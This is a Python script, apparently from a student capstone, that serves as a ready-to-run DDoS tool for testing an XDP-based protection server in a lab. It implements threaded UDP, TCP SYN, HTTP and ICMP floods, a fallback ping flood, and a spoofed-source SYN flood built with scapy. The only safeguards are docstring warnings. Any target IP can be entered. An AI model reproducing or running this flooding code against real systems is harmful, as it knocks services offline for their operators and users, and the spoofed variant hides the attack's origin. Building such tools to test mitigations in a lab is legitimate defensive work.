#!/usr/bin/env python3
"""
DDoS attack tool for the capstone demonstration -- FOR THE LAB NETWORK ONLY.

Run this on the ATTACKER laptop. It floods the protection server with real packets; the
server's XDP program detects the source and drops the packets in the kernel.

  Windows:  double-click attack.bat, or:  python ddos_attack.py 10.23.12.77
  Linux:    sudo python3 ddos_attack.py 10.23.12.77

Attack types (choose with --type, default udp):
  udp    UDP flood        - high packets/s to a port. No admin needed. Works everywhere.
  tcp    TCP SYN flood    - opens many half-open connections. No admin needed.
  http   HTTP flood       - many web requests. No admin needed.
  icmp   ICMP ping flood  - needs admin (Windows) / root (Linux) for the fast raw-socket
                            path; otherwise falls back to the system `ping` flood.
  syn    Spoofed SYN flood- random fake source IPs (needs scapy + admin/root; on Windows
                            also Npcap). Shows a *distributed* attack from one machine.
  all    Everything above at once (except spoofed syn).

Only point this at a server you own and are testing (the lab machine). Press Ctrl+C to stop.
"""

import argparse
import os
import random
import socket
import struct
import sys
import threading
import time

STOP = threading.Event()
SENT = [0]                      # total packets/requests sent (list = shared, GIL-atomic +=)
SENT_LOCK = threading.Lock()


def bump(n=1):
    with SENT_LOCK:
        SENT[0] += n


def is_admin() -> bool:
    if os.name == 'nt':
        try:
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False
    return hasattr(os, 'geteuid') and os.geteuid() == 0


# --------------------------------------------------------------------------- UDP
def udp_worker(target, port, size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(size) if hasattr(random, '_urandom') else os.urandom(size)
    addr = (target, port)
    while not STOP.is_set():
        n = 0
        for _ in range(200):
            try:
                sock.sendto(payload, addr)
                n += 1
            except OSError:
                break
        bump(n)


# ------------------------------------------------------------------- TCP SYN flood
def tcp_worker(target, port):
    """Half-open connections: each connect() sends a real SYN to the target."""
    addr = (target, port)
    while not STOP.is_set():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(False)
        try:
            s.connect_ex(addr)          # fires the SYN, does not wait for the handshake
            bump()
        except OSError:
            pass
        finally:
            try:
                s.close()
            except OSError:
                pass


# ------------------------------------------------------------------------ HTTP flood
def http_worker(target, port):
    req = (f"GET /?{random.randint(0, 1 << 30)} HTTP/1.1\r\n"
           f"Host: {target}\r\nUser-Agent: lab-load/1.0\r\nAccept: */*\r\n\r\n").encode()
    addr = (target, port)
    while not STOP.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect(addr)
            s.sendall(req)
            try:
                s.recv(256)
            except OSError:
                pass
            s.close()
            bump()
        except OSError:
            time.sleep(0.002)


# ------------------------------------------------------------------------ ICMP flood
def _icmp_packet(seq: int) -> bytes:
    header = struct.pack('!BBHHH', 8, 0, 0, os.getpid() & 0xFFFF, seq & 0xFFFF)
    payload = b'capstone-lab-' + b'Z' * 48
    chk = _checksum(header + payload)
    header = struct.pack('!BBHHH', 8, 0, chk, os.getpid() & 0xFFFF, seq & 0xFFFF)
    return header + payload


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\0'
    s = sum(struct.unpack(f'!{len(data) // 2}H', data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def icmp_worker(target):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except (PermissionError, OSError):
        return False
    addr, seq = (target, 0), 0
    while not STOP.is_set():
        n = 0
        for _ in range(100):
            try:
                sock.sendto(_icmp_packet(seq), addr)
                seq += 1
                n += 1
            except OSError:
                break
        bump(n)
    return True


def icmp_via_ping(target):
    """Fallback when raw sockets are not allowed: a flood of system pings."""
    import subprocess
    if os.name == 'nt':
        cmd = ['ping', '-n', '1', '-l', '65500', '-w', '100', target]
    else:
        # -f needs root; without it this still sends one ping per call
        cmd = ['ping', '-c', '1', '-s', '1400', '-W', '1', target]
    while not STOP.is_set():
        try:
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            bump()
        except OSError:
            time.sleep(0.01)


# ------------------------------------------------------------- spoofed SYN (scapy)
def spoofed_syn(target, port, threads):
    try:
        from scapy.all import IP, TCP, send, conf
        conf.verb = 0
    except ImportError:
        print("  [syn] scapy is not installed. Use --type tcp instead, or: pip install scapy")
        return False
    if not is_admin():
        print("  [syn] spoofed SYN needs admin/root (and Npcap on Windows). Use --type tcp instead.")
        return False

    def worker():
        while not STOP.is_set():
            src = f"{random.randint(11,240)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            pkt = IP(src=src, dst=target) / TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
            try:
                send(pkt, verbose=0)
                bump()
            except OSError:
                pass
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    return True


# --------------------------------------------------------------------------- driver
def reporter(attack_name, target):
    start, last, last_n = time.time(), time.time(), 0
    while not STOP.is_set():
        time.sleep(1.0)
        with SENT_LOCK:
            total = SENT[0]
        now = time.time()
        rate = (total - last_n) / (now - last) if now > last else 0
        print(f"  [{attack_name}] -> {target} | {total:,} sent | {rate:,.0f}/s", flush=True)
        last, last_n = now, total


def start_threads(func, args, n):
    for _ in range(n):
        threading.Thread(target=func, args=args, daemon=True).start()


def run(target, atype, port, size, threads, duration):
    print("=" * 60)
    print(f"  TARGET : {target}" + (f":{port}" if atype in ('udp', 'tcp', 'http', 'syn') else ""))
    print(f"  ATTACK : {atype.upper()}   threads: {threads}   duration: "
          f"{'until Ctrl+C' if duration <= 0 else str(duration) + 's'}")
    print(f"  Privileges: {'admin/root' if is_admin() else 'normal user'}")
    print("=" * 60)
    print("  Watch the server dashboard: this source should be detected and blocked,")
    print("  and these packets dropped by XDP in the kernel. Ctrl+C to stop.\n")

    if atype == 'udp':
        start_threads(udp_worker, (target, port, size), threads)
    elif atype == 'tcp':
        start_threads(tcp_worker, (target, port), threads)
    elif atype == 'http':
        start_threads(http_worker, (target, port), threads)
    elif atype == 'icmp':
        if is_admin():
            start_threads(icmp_worker, (target,), threads)
        else:
            print("  [icmp] no admin/root: falling back to the system ping flood (slower).")
            print("         For a fast ICMP flood, re-run as Administrator / with sudo.\n")
            start_threads(icmp_via_ping, (target,), min(threads, 16))
    elif atype == 'syn':
        if not spoofed_syn(target, port, threads):
            return
    elif atype == 'all':
        half = max(1, threads // 2)
        start_threads(udp_worker, (target, port, size), half)
        start_threads(tcp_worker, (target, port), max(1, half // 2))
        start_threads(http_worker, (target, 80), max(1, half // 2))
        (start_threads(icmp_worker, (target,), 2) if is_admin()
         else start_threads(icmp_via_ping, (target,), 4))

    threading.Thread(target=reporter, args=(atype, target), daemon=True).start()
    try:
        if duration > 0:
            STOP.wait(duration)
        else:
            while not STOP.wait(0.5):
                pass
    except KeyboardInterrupt:
        pass
    finally:
        STOP.set()
        time.sleep(0.3)
        with SENT_LOCK:
            print(f"\n  Stopped. Total sent: {SENT[0]:,}")


def ask(prompt, default):
    try:
        v = input(prompt).strip()
    except EOFError:
        v = ''
    return v or default


def main():
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument('target', nargs='?', help='Server IP, e.g. 10.23.12.77')
    p.add_argument('--type', '-t', default=None,
                   choices=['udp', 'tcp', 'http', 'icmp', 'syn', 'all'], help='Attack type (default: udp)')
    p.add_argument('--port', '-p', type=int, default=None, help='Target port (default: 9999 udp/tcp, 80 http)')
    p.add_argument('--size', type=int, default=1024, help='UDP payload bytes (default: 1024)')
    p.add_argument('--threads', '-n', type=int, default=8, help='Parallel senders (default: 8)')
    p.add_argument('--duration', '-d', type=int, default=0, help='Seconds; 0 = until Ctrl+C (default)')
    a = p.parse_args()

    # Interactive prompts when double-clicked with no arguments
    target = a.target or ask("Server IP to attack [10.23.12.77]: ", "10.23.12.77")
    atype = a.type or ask("Attack type udp/tcp/http/icmp/syn/all [udp]: ", "udp").lower()
    if atype not in ('udp', 'tcp', 'http', 'icmp', 'syn', 'all'):
        atype = 'udp'
    port = a.port if a.port else (80 if atype == 'http' else 9999)

    run(target, atype, port, a.size, max(1, a.threads), a.duration)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        STOP.set()
        print("\n  Stopped.")
